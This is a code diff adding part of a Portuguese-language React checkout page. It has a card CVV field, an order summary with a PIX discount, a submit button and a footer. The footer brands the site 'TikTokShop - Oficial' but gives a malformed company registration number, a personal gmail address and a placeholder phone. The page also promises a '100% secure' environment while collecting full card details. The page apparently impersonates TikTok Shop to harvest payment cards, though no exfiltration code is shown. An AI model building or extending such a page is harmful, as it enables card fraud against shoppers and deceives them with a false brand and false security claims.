@@ -584,3 +584,92 @@ const Checkout = () => {
                         maxLength={5}
                       />
                     </div>
+                    <div>
+                      <Label htmlFor="card-cvv">CVV</Label>
+                      <Input
+                        id="card-cvv"
+                        placeholder="123"
+                        value={cardData.cvv}
+                        onChange={(e) => handleCardInputChange('cvv', e.target.value)}
+                        maxLength={4}
+                        type="password"
+                      />
+                    </div>
+                  </div>
+                </div>
+              )}
+            </div>
+          </RadioGroup>
+        </div>
+
+        {/* Order Summary */}
+        <div className="bg-white rounded-lg p-6 shadow-sm mb-6">
+          <h2 className="text-xl font-bold mb-4">Resumo do Pedido</h2>
+          <div className="space-y-2">
+            <div className="flex justify-between">
+              <span>Subtotal</span>
+              <span>R$ 67,90</span>
+            </div>
+            <div className="flex justify-between text-green-600">
+              <span>Desconto PIX (7%)</span>
+              <span>- R$ 4,75</span>
+            </div>
+            <div className="flex justify-between text-green-600">
+              <span>Frete</span>
+              <span>Grátis</span>
+            </div>
+            <Separator className="my-2" />
+            <div className="flex justify-between text-xl font-bold">
+              <span>Total</span>
+              <span className="text-green-600">
+                    R$ {selectedPayment === 'Pix' ? '63,15' : '67,90'}
+                </span>
+            </div>
+          </div>
+        </div>
+
+        {/* Submit Button */}
+        <Button 
+          className="w-full h-14 text-lg font-bold uppercase"
+          style={{ backgroundColor: '#F72E54' }}
+          onClick={processPayment}
+          disabled={isProcessing}
+        >
+          {isProcessing ? 'Processando...' : 'Finalizar Compra'}
+        </Button>
+
+        {/* ERRO GERAL DA API (Se o erro não for de CPF) */}
+        {apiError?.field === 'general' && (
+            <div className="mt-4 text-center text-red-500 font-medium p-3 border border-red-500 rounded-lg bg-red-50">
+                ⚠️ Erro no Processamento: {apiError.message}
+            </div>
+        )}
+
+        {/* Security Info */}
+        <div className="mt-6 text-center text-sm text-gray-600">
+          <div className="flex items-center justify-center gap-2 mb-2">
+            <Lock className="h-4 w-4" />
+            <span>Ambiente 100% Seguro</span>
+          </div>
+          <p>Seus dados estão protegidos e a compra é totalmente segura</p>
+        </div>
+      </div>
+
+        {/* Footer */}
+      <footer className="bg-[#f2f2f2] py-8 mt-12">
+        <div className="container mx-auto px-4 text-center text-sm text-[#3a3636]">
+          <p className="mb-2">© 2025 TikTokShop - Oficial. Todos os direitos reservados.</p>
+          <div className="flex items-center justify-center gap-4">
+            <span>CNPJ: 21.999.999/923131</span>
+            <span>•</span>
+            <span>pedroalvares@gmail.com</span>
+            <span>•</span>
+            <span>(21) 99999-9999</span>
+          </div>
+        </div>
+      </footer>
+    </div>
+  );
+};
+
+export default Checkout;
